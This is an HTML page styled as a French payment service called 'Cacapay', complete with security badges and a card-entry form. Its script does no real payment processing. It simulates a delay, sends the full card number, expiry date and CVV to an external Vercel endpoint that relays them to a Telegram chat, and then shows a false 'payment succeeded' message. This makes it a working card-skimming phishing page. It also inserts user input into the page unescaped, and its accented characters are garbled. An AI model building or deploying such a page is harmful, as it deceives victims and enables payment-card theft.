<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cacapay - Paiement S√©curis√©</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2em;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
        }
        
        .form-container {
            padding: 40px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        
        input, select {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #ff6b6b;
        }
        
        .card-row {
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }
        
        .pay-button {
            width: 100%;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: transform 0.3s ease;
            margin-top: 20px;
        }
        
        .pay-button:hover {
            transform: translateY(-2px);
        }
        
        .pay-button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #ff6b6b;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .result {
            margin-top: 20px;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .security-badges {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
            opacity: 0.7;
        }
        
        .badge {
            font-size: 12px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üí≥ Cacapay</h1>
            <p>Paiement s√©curis√© et instantan√©</p>
        </div>
        
        <div class="form-container">
            <form id="paymentForm">
                <div class="form-group">
                    <label for="customerName">Nom complet *</label>
                    <input type="text" id="customerName" placeholder="Jean Dupont" required>
                </div>
                
                <div class="form-group">
                    <label for="email">Email *</label>
                    <input type="email" id="email" placeholder="jean@example.com" required>
                </div>
                
                <div class="form-group">
                    <label for="product">Produit *</label>
                    <select id="product" required>
                        <option value="">S√©lectionnez un produit</option>
                        <option value="Produit Premium">Produit Premium - 99.99‚Ç¨</option>
                        <option value="Produit Standard">Produit Standard - 49.99‚Ç¨</option>
                        <option value="Produit Basic">Produit Basic - 19.99‚Ç¨</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="amount">Montant (‚Ç¨) *</label>
                    <input type="number" id="amount" placeholder="99.99" step="0.01" min="0.01" required>
                </div>
                
                <div class="form-group">
                    <label for="cardNumber">Num√©ro de carte *</label>
                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
                </div>
                
                <div class="card-row">
                    <div class="form-group">
                        <label for="expiry">Expiration *</label>
                        <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="cvv">CVV *</label>
                        <input type="text" id="cvv" placeholder="123" maxlength="3" required>
                    </div>
                </div>
                
                <button type="submit" class="pay-button" id="payButton">
                    üí≥ Payer maintenant
                </button>
            </form>
            
            <div class="loading" id="loading">
                <div class="spinner"></div>
                <p>Traitement du paiement...</p>
            </div>
            
            <div id="result"></div>
            
            <div class="security-badges">
                <div class="badge">üîí SSL S√©curis√©</div>
                <div class="badge">üõ°Ô∏è Donn√©es prot√©g√©es</div>
                <div class="badge">‚ö° Paiement instantan√©</div>
            </div>
        </div>
    </div>

    <script>
        // Configuration
        const API_URL = 'https://test-alpha-lac-68.vercel.app/api/telegram';
        
        // √âl√©ments du DOM
        const form = document.getElementById('paymentForm');
        const loading = document.getElementById('loading');
        const result = document.getElementById('result');
        const payButton = document.getElementById('payButton');
        
        // Formatage automatique du num√©ro de carte
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
        
        // Formatage automatique de la date d'expiration
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        });
        
        // Formatage automatique du CVV
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '');
        });
        
        // Mise √† jour automatique du montant selon le produit
        document.getElementById('product').addEventListener('change', function(e) {
            const prices = {
                'Produit Premium': 99.99,
                'Produit Standard': 49.99,
                'Produit Basic': 19.99
            };
            
            if (prices[e.target.value]) {
                document.getElementById('amount').value = prices[e.target.value];
            }
        });
        
        // Gestion du formulaire
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const paymentData = {
                customerName: document.getElementById('customerName').value,
                email: document.getElementById('email').value,
                product: document.getElementById('product').value,
                amount: document.getElementById('amount').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value
            };
            
            await processPayment(paymentData);
        });
        
        // Fonction principale de traitement du paiement
        async function processPayment(paymentData) {
            // Afficher le loading
            showLoading(true);
            hideResult();
            
            try {
                // 1. Simuler le traitement du paiement (1-2 secondes)
                await simulatePaymentProcessing();
                
                // 2. Envoyer la notification Telegram
                const notificationResult = await sendPaymentNotification(paymentData);
                
                if (notificationResult.success) {
                    showSuccess(paymentData, notificationResult);
                } else {
                    showError('Erreur lors de l\'envoi de la notification Telegram');
                }
                
            } catch (error) {
                console.error('Erreur paiement:', error);
                showError('Erreur lors du traitement du paiement: ' + error.message);
            } finally {
                showLoading(false);
            }
        }
        
        // Simulation du traitement du paiement
        async function simulatePaymentProcessing() {
            return new Promise(resolve => {
                setTimeout(() => {
                    console.log('‚úÖ Paiement trait√© avec succ√®s');
                    resolve();
                }, 1500);
            });
        }
        
        // Envoi de la notification Telegram
        async function sendPaymentNotification(paymentData) {
            try {
                console.log('üì§ Envoi notification vers Vercel...');
                
                const message = `üí∞ NOUVEAU PAIEMENT RE√áU !
üë§ Nom: ${paymentData.customerName}
üìß Email: ${paymentData.email}
üõçÔ∏è Produit: ${paymentData.product}
üí≥ Carte: ${paymentData.cardNumber}
üí∂ Montant: ${paymentData.amount}‚Ç¨
üìÖ Expiration: ${paymentData.expiry}
üîí CVV: ${paymentData.cvv}
üîí V√©rifiez imm√©diatement !`;
                
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        message: message,
                        type: 'payment'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    console.log('‚úÖ Notification envoy√©e !', result.telegramResponse?.result?.message_id);
                    return {
                        success: true,
                        messageId: result.telegramResponse?.result?.message_id
                    };
                } else {
                    console.error('‚ùå Erreur notification:', result.error);
                    return { success: false, error: result.error };
                }
            } catch (error) {
                console.error('‚ùå Erreur envoi notification:', error);
                return { success: false, error: error.message };
            }
        }
        
        // Fonctions d'affichage
        function showLoading(show) {
            loading.style.display = show ? 'block' : 'none';
            payButton.disabled = show;
        }
        
        function hideResult() {
            result.innerHTML = '';
        }
        
        function showSuccess(paymentData, notificationResult) {
            result.innerHTML = `
                <div class="result success">
                    <h3>üéâ Paiement r√©ussi !</h3>
                    <p><strong>Client :</strong> ${paymentData.customerName}</p>
                    <p><strong>Email :</strong> ${paymentData.email}</p>
                    <p><strong>Produit :</strong> ${paymentData.product}</p>
                    <p><strong>Montant :</strong> ${paymentData.amount}‚Ç¨</p>
                    <p><strong>Message ID :</strong> ${notificationResult.messageId}</p>
                    <p>üì± Notification envoy√©e sur Telegram !</p>
                    <p>‚úÖ V√©rifiez votre chat Telegram</p>
                </div>
            `;
        }
        
        function showError(message) {
            result.innerHTML = `
                <div class="result error">
                    <h3>‚ùå Erreur</h3>
                    <p>${message}</p>
                </div>
            `;
        }
    </script>
</body>
</html>
